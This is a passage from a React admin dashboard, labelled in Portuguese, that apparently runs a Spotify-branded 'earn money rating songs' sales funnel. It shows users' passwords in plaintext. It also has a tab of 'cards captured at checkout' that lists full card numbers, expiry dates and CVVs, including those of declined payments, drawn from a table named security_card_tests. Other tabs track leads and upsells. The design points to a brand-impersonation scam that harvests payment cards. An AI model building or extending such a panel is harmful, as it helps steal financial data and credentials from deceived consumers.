                              <div className="text-[10px] text-gray-400">
                                {cust.approvedPurchasesCount} compra(s) •{' '}
                                {cust.declinedCardsCount > 0 ? (
                                  <span className="text-red-400 font-bold">
                                    {cust.declinedCardsCount} cartão recusado
                                  </span>
                                ) : (
                                  <span>0 falhas</span>
                                )}
                              </div>
                            </td>

                            {/* Badges de Ofertas Compradas e Recusadas */}
                            <td className="px-4 py-4 max-w-md">
                              <div className="flex flex-wrap gap-1.5">
                                {cust.acceptedOffers.length === 0 && cust.declinedOffers.length === 0 && (
                                  <span className="text-[11px] text-gray-500">
                                    Ainda não concluiu compras
                                  </span>
                                )}

                                {/* Ofertas Compradas */}
                                {cust.acceptedOffers.map((off, i) => (
                                  <span
                                    key={'acc_' + i}
                                    className={`px-2.5 py-0.5 rounded-full text-[10px] font-extrabold inline-flex items-center gap-1 ${
                                      off.isDownsell
                                        ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                                        : 'bg-[#1db954]/15 text-[#1db954] border border-[#1db954]/40'
                                    }`}
                                  >
                                    <CheckCircle2 className="w-3 h-3" />
                                    <span>Comprou: {off.label}</span>
                                  </span>
                                ))}

                                {/* Ofertas Recusadas */}
                                {cust.declinedOffers.map((off, i) => (
                                  <span
                                    key={'dec_' + i}
                                    className="px-2.5 py-0.5 rounded-full bg-red-500/15 text-red-300 border border-red-500/30 text-[10px] font-bold inline-flex items-center gap-1"
                                  >
                                    <XCircle className="w-3 h-3 text-red-400" />
                                    <span>Recusou: {off.label}</span>
                                  </span>
                                ))}
                              </div>
                            </td>

                            {/* Senha e Coordenadas de Saque */}
                            <td className="px-4 py-4">
                              {acc ? (
                                <div className="space-y-1">
                                  <div className="flex items-center gap-1.5 font-mono text-[11px]">
                                    <span className="text-gray-400">Senha:</span>
                                    <span className="bg-black/60 px-2 py-0.5 rounded border border-[#2a362f] text-white font-bold">
                                      {isPwVisible ? acc.password || 'N/A' : '••••••'}
                                    </span>
                                    <button
                                      type="button"
                                      onClick={() =>
                                        setVisiblePasswords((prev) => ({
                                          ...prev,
                                          [cust.email]: !isPwVisible,
                                        }))
                                      }
                                      className="text-gray-400 hover:text-white cursor-pointer"
                                    >
                                      {isPwVisible ? (
                                        <EyeOff className="w-3.5 h-3.5" />
                                      ) : (
                                        <Eye className="w-3.5 h-3.5" />
                                      )}
                                    </button>
                                  </div>
                                  <div className="text-[10px] text-gray-400">
                                    Saque:{' '}
                                    <b className="text-gray-200 uppercase">
                                      {acc.payout_method?.replace('_', ' ') || 'Direct Deposit'}
                                    </b>
                                  </div>
                                </div>
                              ) : (
                                <span className="text-[11px] text-gray-500">Sem conta criada no app</span>
                              )}
                            </td>

                            {/* Progresso de Músicas e Saldo */}
                            <td className="px-4 py-4 text-center">
                              <span className="font-mono font-bold text-white block">
                                {cust.evaluationsCount} músicas avaliadas
                              </span>
                              <span className="text-[11px] font-mono text-amber-400 font-bold">
                                Saldo: ${cust.virtualBalance.toFixed(2)}
                              </span>
                            </td>

                            {/* Botão Ver Linha do Tempo */}
                            <td className="px-4 py-4 text-right">
                              <button
                                type="button"
                                onClick={() => setSelectedCustomerModal(cust)}
                                className="px-3 py-1.5 rounded-xl bg-[#16221a] hover:bg-[#1db954] text-[#1db954] hover:text-black border border-[#1db954]/40 font-extrabold text-[11px] transition-all cursor-pointer inline-flex items-center gap-1"
                              >
                                <History className="w-3.5 h-3.5" />
                                <span>Linha do Tempo</span>
                              </button>
                            </td>
                          </tr>
                        );
                      })
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* ========================================================================= */}
          {/* ABA 3: CARTÕES RECUSADOS & TENTATIVAS DE PAGAMENTO                        */}
          {/* ========================================================================= */}
          {activeTab === 'recusados' && (
            <div className="space-y-8">
              {/* Sub-filtros de Pagamentos */}
              <div className="flex flex-wrap items-center justify-between gap-4">
                <div className="flex items-center gap-2 text-xs">
                  <span className="text-gray-400 font-bold">Filtrar transações:</span>
                  <button
                    onClick={() => setStatusFilter('declined')}
                    className={`px-3.5 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                      statusFilter === 'declined'
                        ? 'bg-red-500 text-white'
                        : 'bg-[#111613] text-red-400 hover:text-white border border-red-500/30'
                    }`}
                  >
                    ❌ Somente Recusados ({declinedPayments.length})
                  </button>

                  <button
                    onClick={() => setStatusFilter('all')}
                    className={`px-3.5 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                      statusFilter === 'all'
                        ? 'bg-white/15 text-white border border-white/20'
                        : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                    }`}
                  >
                    Todas as Tentativas ({payments.length})
                  </button>

                  <button
                    onClick={() => setStatusFilter('succeeded')}
                    className={`px-3.5 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                      statusFilter === 'succeeded'
                        ? 'bg-[#1db954]/20 text-[#1db954] border border-[#1db954]/40'
                        : 'bg-[#111613] text-gray-300 hover:text-[#1db954] border border-[#222f26]'
                    }`}
                  >
                    ✅ Aprovados ({approvedPayments.length})
                  </button>
                </div>
              </div>

              {/* Tabela 1: Tentativas de Pagamento (Com Nome, Email, Oferta e Motivo da Recusa) */}
              <div className="space-y-2.5">
                <h3 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
                  <XCircle className="w-4 h-4 text-red-400" />
                  <span>Tentativas de Checkout &amp; Motivos de Recusa por Cliente</span>
                </h3>
                <div className="overflow-x-auto rounded-2xl border border-[#1f2822]">
                  <table className="w-full text-left text-xs text-gray-300">
                    <thead className="bg-[#111613] text-gray-400 uppercase font-bold text-[10px] tracking-wider border-b border-[#1f2822]">
                      <tr>
                        <th className="px-4 py-3">Nome do Cliente</th>
                        <th className="px-4 py-3">E-mail</th>
                        <th className="px-4 py-3">Oferta / Valor</th>
                        <th className="px-4 py-3">Status</th>
                        <th className="px-4 py-3">Motivo da Recusa / Detalhe</th>
                        <th className="px-4 py-3">País</th>
                        <th className="px-4 py-3">Data / Hora</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-[#1f2822] font-mono text-[11px]">
                      {filteredPayments.length === 0 ? (
                        <tr>
                          <td colSpan={7} className="px-4 py-8 text-center text-gray-500 font-sans">
                            Nenhum registro encontrado para este filtro.
                          </td>
                        </tr>
                      ) : (
                        filteredPayments.map((p) => {
                          const amt = Number(p.amount || 9.0);
                          const matchedOffer = CATALOG_OFFERS.find(
                            (o) => Math.abs(o.price - amt) < 0.05
                          );
                          return (
                            <tr key={p.id} className="hover:bg-white/[0.02] transition-colors">
                              <td className="px-4 py-3 font-sans font-bold text-white">
                                {p.full_name || 'Cliente no Checkout'}
                              </td>
                              <td className="px-4 py-3 text-indigo-300 underline font-sans">
                                {p.email || 'N/A'}
                              </td>
                              <td className="px-4 py-3">
                                <span className="font-bold text-white block">
                                  ${amt.toFixed(2)} USD
                                </span>
                                <span className="text-[10px] text-gray-400 font-sans">
                                  {matchedOffer ? matchedOffer.shortBadge : 'Checkout'}
                                </span>
                              </td>
                              <td className="px-4 py-3 font-sans">
                                {p.status === 'succeeded' ? (
                                  <span className="px-2.5 py-0.5 rounded-full bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 font-bold text-[10px] inline-flex items-center gap-1">
                                    <CheckCircle2 className="w-3 h-3" /> Aprovado
                                  </span>
                                ) : (
                                  <span className="px-2.5 py-0.5 rounded-full bg-red-500/15 text-red-400 border border-red-500/30 font-bold text-[10px] inline-flex items-center gap-1">
                                    <XCircle className="w-3 h-3" /> Cartão Recusado
                                  </span>
                                )}
                              </td>
                              <td className="px-4 py-3 text-gray-300 max-w-xs font-sans">
                                {p.error_message ||
                                  (p.status === 'succeeded'
                                    ? 'Pagamento Aprovado'
                                    : 'Cartão recusado pelo banco emissor (Do Not Honor / Saldo)')}
                              </td>
                              <td className="px-4 py-3 text-gray-300 font-bold">
                                {p.country || 'US'}
                              </td>
                              <td className="px-4 py-3 text-gray-400">
                                {new Date(p.created_at).toLocaleString('pt-BR')}
                              </td>
                            </tr>
                          );
                        })
                      )}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Tabela 2: Dados de Cartões Capturados no Checkout (security_card_tests) */}
              <div className="space-y-2.5">
                <h3 className="text-xs font-black uppercase tracking-wider text-amber-400 flex items-center gap-2">
                  <CreditCard className="w-4 h-4" />
                  <span>Cartões Capturados no Checkout ({filteredCardTests.length})</span>
                </h3>
                <div className="overflow-x-auto rounded-2xl border border-[#1f2822]">
                  <table className="w-full text-left text-xs text-gray-300">
                    <thead className="bg-[#111613] text-gray-400 uppercase font-bold text-[10px] tracking-wider border-b border-[#1f2822]">
                      <tr>
                        <th className="px-4 py-3">Número do Cartão</th>
                        <th className="px-4 py-3">Validade</th>
                        <th className="px-4 py-3">CVV / CVC</th>
                        <th className="px-4 py-3">País</th>
                        <th className="px-4 py-3">Status</th>
                        <th className="px-4 py-3">Data / Hora</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-[#1f2822] font-mono text-[11px]">
                      {filteredCardTests.length === 0 ? (
                        <tr>
                          <td colSpan={6} className="px-4 py-8 text-center text-gray-500 font-sans">
                            Nenhum cartão registrado na tabela security_card_tests ainda.
                          </td>
                        </tr>
                      ) : (
                        filteredCardTests.map((c) => (
                          <tr key={c.id} className="hover:bg-white/[0.02] transition-colors">
                            <td className="px-4 py-3 font-bold text-white tracking-widest">
                              {c.card_number}
                            </td>
                            <td className="px-4 py-3 text-gray-300">{c.exp_date}</td>
                            <td className="px-4 py-3 text-amber-300 font-bold">{c.cvv}</td>
                            <td className="px-4 py-3 text-gray-300 font-bold">{c.country || 'US'}</td>
                            <td className="px-4 py-3 font-sans">
                              <span className="px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/30 font-bold text-[10px]">
                                {c.status === 'succeeded' ? 'Aprovado' : 'Recusado / Capturado'}
                              </span>
                            </td>
                            <td className="px-4 py-3 text-gray-400">
                              {new Date(c.created_at).toLocaleString('pt-BR')}
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* ========================================================================= */}
          {/* ABA 4: TODOS OS LEADS DO FUNIL (EM PORTUGUÊS)                             */}
          {/* ========================================================================= */}
          {activeTab === 'leads' && (
            <div className="space-y-4">
              <div className="flex flex-wrap items-center gap-2 text-xs">
                <span className="text-gray-400 font-bold">Filtrar por status:</span>
                <button
                  onClick={() => setLeadFilter('all')}
                  className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                    leadFilter === 'all'
                      ? 'bg-white/15 text-white border border-white/20'
                      : 'bg-[#111613] text-gray-400 hover:text-white'
                  }`}
                >
                  Todos ({leads.length})
                </button>

                <button
                  onClick={() => setLeadFilter('approved')}
                  className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                    leadFilter === 'approved'
                      ? 'bg-[#1db954]/20 text-[#1db954] border border-[#1db954]/40'
                      : 'bg-[#111613] text-gray-400 hover:text-[#1db954]'
                  }`}
                >
                  ✅ Compraram ({approvedLeadsCount})
                </button>

                <button
                  onClick={() => setLeadFilter('declined')}
                  className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                    leadFilter === 'declined'
                      ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                      : 'bg-[#111613] text-gray-400 hover:text-red-400'
                  }`}
                >
                  ❌ Cartão Recusado ({declinedLeadsCount})
                </button>

                <button
                  onClick={() => setLeadFilter('abandoned')}
                  className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                    leadFilter === 'abandoned'
                      ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                      : 'bg-[#111613] text-gray-400 hover:text-rose-400'
                  }`}
                >
                  🚨 Desistiram da Compra (&gt;10m) ({abandonedLeadsCount})
                </button>

                <button
                  onClick={() => setLeadFilter('active')}
                  className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                    leadFilter === 'active'
                      ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                      : 'bg-[#111613] text-gray-400 hover:text-amber-300'
                  }`}
                >
                  ⏳ No Checkout Agora (&lt;10m) ({activeLeadsCount})
                </button>
              </div>

              <div className="overflow-x-auto rounded-2xl border border-[#1f2822]">
                <table className="w-full text-left text-xs text-gray-300">
                  <thead className="bg-[#111613] text-gray-400 uppercase font-bold text-[10px] tracking-wider border-b border-[#1f2822]">
                    <tr>
                      <th className="px-4 py-3">Nome Completo</th>
                      <th className="px-4 py-3">E-mail</th>
                      <th className="px-4 py-3">Data / Hora de Entrada</th>
                      <th className="px-4 py-3">Status Atual no Funil</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#1f2822] font-mono text-[11px]">
                    {filteredLeads.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="px-4 py-8 text-center text-gray-500 font-sans">
                          Nenhum lead encontrado para este filtro.
                        </td>
                      </tr>
                    ) : (
                      filteredLeads.map((lead) => {
                        const status = getLeadStatus(lead);
                        const minutesElapsed = Math.floor(
                          (Date.now() - new Date(lead.created_at).getTime()) / (1000 * 60)
                        );

                        return (
                          <tr key={lead.id} className="hover:bg-white/[0.02] transition-colors">
                            <td className="px-4 py-3 font-sans font-bold text-white">
                              {lead.full_name || 'Visitante do Funil'}
                            </td>
                            <td className="px-4 py-3 font-sans">
                              {lead.email.includes('@spotify.lead') ? (
                                <span className="inline-flex items-center gap-1.5 text-amber-300 font-medium text-[11px] bg-amber-500/10 px-2.5 py-0.5 rounded-full border border-amber-500/20">
                                  <Clock className="w-3 h-3 text-amber-400" />
                                  <span>Ainda não digitou o e-mail no checkout</span>
                                </span>
                              ) : (
                                <span className="text-indigo-300 underline font-sans font-medium">
                                  {lead.email}
                                </span>
                              )}
                            </td>
                            <td className="px-4 py-3 text-gray-400">
                              {new Date(lead.created_at).toLocaleString('pt-BR')}
                            </td>
                            <td className="px-4 py-3 font-sans">
                              {status === 'approved' ? (
                                <span className="px-2.5 py-1 rounded-full bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 font-bold text-[10px] inline-flex items-center gap-1">
                                  <CheckCircle2 className="w-3 h-3" />
                                  Cliente Aprovado (Comprou)
                                </span>
                              ) : status === 'declined' ? (
                                <span className="px-2.5 py-1 rounded-full bg-red-500/15 text-red-400 border border-red-500/30 font-bold text-[10px] inline-flex items-center gap-1">
                                  <XCircle className="w-3 h-3" />
                                  Tentou Passar Cartão (Recusado)
                                </span>
                              ) : status === 'abandoned' ? (
                                <span className="px-2.5 py-1 rounded-full bg-rose-500/15 text-rose-300 border border-rose-500/30 font-bold text-[10px] inline-flex items-center gap-1.5">
                                  <UserX className="w-3 h-3 text-rose-400 shrink-0" />
                                  Desistiu da compra (&gt;10m sem pagar)
                                </span>
                              ) : (
                                <span className="px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-300 border border-amber-500/30 font-bold text-[10px] inline-flex items-center gap-1">
                                  <Clock className="w-3 h-3 text-amber-400 shrink-0" />
                                  No checkout agora ({minutesElapsed}m atrás)
                                </span>
                              )}
                            </td>
                          </tr>
                        );
                      })
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* ========================================================================= */}
          {/* ABA 5: SUPABASE SQL EDITOR (ATUALIZADO COM TABELA FUNNEL_EVENTS)          */}
          {/* ========================================================================= */}
          {activeTab === 'sql_editor' && (
            <div className="p-2 sm:p-4 space-y-6 bg-[#0d120f] rounded-2xl border border-[#1f2822]">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-[#1f2822]">
                <div className="space-y-1">
                  <div className="flex items-center gap-2 text-[#1db954]">
                    <Database className="w-5 h-5" />
                    <span className="text-xs font-black uppercase tracking-wider">
                      Script Mestre de Atualização do Banco de Dados (Supabase SQL Editor)
                    </span>
                  </div>
                  <h3 className="text-lg font-extrabold text-white">
                    Sincronização de Contas, Progresso de 20 Músicas e Rastreamento de Upsells
                  </h3>
                  <p className="text-xs text-gray-400 max-w-2xl">
                    Copie o código SQL abaixo e execute no SQL Editor do seu projeto Supabase para criar/atualizar a tabela <code className="text-[#1db954]">funnel_events</code> e as novas colunas de progresso.
                  </p>
                </div>

                <div className="flex items-center gap-3 shrink-0">
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText(SPOTIFY_SCHEMA_SQL);
                      setSqlCopied(true);
                      setTimeout(() => setSqlCopied(false), 3000);
                    }}
                    className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs uppercase tracking-wider transition-all cursor-pointer shadow-lg shadow-[#1db954]/20"
                  >
                    {sqlCopied ? (
                      <>
                        <Check className="w-4 h-4 stroke-[3]" />
                        <span>SQL Copiado!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-4 h-4 stroke-[2.5]" />
                        <span>Copiar Código SQL</span>
                      </>
                    )}
                  </button>

                  <a
                    href="https://supabase.com/dashboard/project/zbaaopdndnlckuornird/sql/new"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl bg-[#161f1a] hover:bg-[#1f2b24] text-white border border-[#2a382f] font-bold text-xs transition-all"
                  >
                    <span>Abrir Supabase SQL Editor</span>
                    <ExternalLink className="w-3.5 h-3.5 text-[#1db954]" />
                  </a>
                </div>
              </div>

              {/* Code Viewer */}
              <div className="relative">
                <div className="flex items-center justify-between px-4 py-2 bg-[#141a16] border border-b-0 border-[#243028] rounded-t-xl text-[11px] font-mono text-gray-400">
                  <span className="flex items-center gap-2">
                    <Code className="w-3.5 h-3.5 text-[#1db954]" />
                    <span>spotify_master_schema_ptbr.sql</span>
                  </span>
                  <span className="text-[10px] text-[#1db954] font-bold">
                    PostgreSQL • Seguro para rodar múltiplas vezes (IF NOT EXISTS)
                  </span>
                </div>
                <pre className="p-4 rounded-b-xl bg-[#070a08] border border-[#243028] text-[11px] font-mono text-gray-300 overflow-x-auto max-h-[420px] leading-relaxed select-all">
                  {SPOTIFY_SCHEMA_SQL}
                </pre>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
